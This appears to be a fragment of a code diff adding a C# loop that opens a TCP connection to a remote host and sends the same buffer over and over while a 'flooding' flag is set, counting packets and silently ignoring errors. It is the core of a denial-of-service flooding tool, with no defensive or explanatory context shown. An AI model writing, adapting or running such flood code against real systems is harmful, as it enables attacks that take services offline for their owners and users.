@@ -1,0 +1,14 @@
+socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+socket.Connect(RHost);
+socket.Blocking = Resp;
+try
+{
+while (IsFlooding)
+{
+
+FloodCount++;
+socket.Send(buf);
+if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+}
+}
+catch { }
